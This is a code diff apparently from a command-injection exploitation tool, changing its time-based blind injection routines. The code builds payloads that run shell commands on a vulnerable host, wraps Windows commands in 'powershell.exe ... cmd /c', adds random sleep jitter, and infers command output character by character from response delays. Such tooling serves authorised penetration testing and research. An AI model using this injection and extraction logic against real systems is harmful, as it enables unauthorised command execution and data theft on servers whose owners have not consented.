@@ -134,7 +134,6 @@ def injection_test(payload, http_request_method, url):
 
   end  = time.time()
   how_long = int(end - start)
-
   return how_long, vuln_parameter
 
 """
@@ -247,12 +246,12 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 
   # Proceed with the next (injection) step!
   if found_chars == True :
+    if settings.TARGET_OS == "win":
+      cmd = previous_cmd
     num_of_chars = output_length + 1
     check_start = 0
     check_end = 0
     check_start = time.time()
-    if settings.TARGET_OS == "win":
-      cmd = previous_cmd
     output = []
     percent = "0.0"
 
@@ -353,17 +352,28 @@ False Positive check and evaluation.
 """
 def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response):
 
+  if settings.TARGET_OS == "win":
+    previous_cmd = cmd
+    if alter_shell:
+      cmd = "\"" + cmd + "\""
+    else: 
+      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"
+
   found_chars = False
-  info_msg = "Testing the reliability of used payload... "
+  info_msg = "Checking the reliability of the used payload  "
+  info_msg += "in case of a false positive result... "
   if settings.VERBOSITY_LEVEL == 1: 
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
   # Check if defined "--verbose" option.
   elif settings.VERBOSITY_LEVEL > 1:
     print settings.print_info_msg(info_msg)
-
+  
+  # Varying the sleep time.
+  timesec = timesec + random.randint(1, 5)
+  
+  # Checking the output length of the used payload.
   for output_length in range(1, 3):
-
     # Execute shell commands on vulnerable host.
     if alter_shell :
       payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
@@ -386,7 +396,7 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
       sys.stdout.write("\n" + settings.print_payload(payload_msg))
     # Check if defined "--verbose" option.
     elif settings.VERBOSITY_LEVEL > 1:
-      info_msg = "Generating a payload for injection..."
+      info_msg = "Generating a payload for testing the reliability of used payload..."
       print settings.print_info_msg(info_msg)
       payload_msg = payload.replace("\n", "\\n") 
       sys.stdout.write(settings.print_payload(payload_msg) + "\n")
@@ -415,6 +425,8 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
       break
 
   if found_chars == True :
+    if settings.TARGET_OS == "win":
+      cmd = previous_cmd
     num_of_chars = output_length + 1
     check_start = 0
     check_end = 0
@@ -422,8 +434,11 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     
     output = [] 
     percent = 0
+    sys.stdout.flush()
+
+    is_valid = False
     for num_of_chars in range(1, int(num_of_chars)):
-      for ascii_char in range(1, 3):
+      for ascii_char in range(1, 9):
  
         # Get the execution ouput, of shell execution.
         if alter_shell:
@@ -478,6 +493,10 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
 
         if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
           output.append(ascii_char)
+          is_valid = True
+          break
+          
+      if is_valid:
           break
 
     check_end  = time.time()
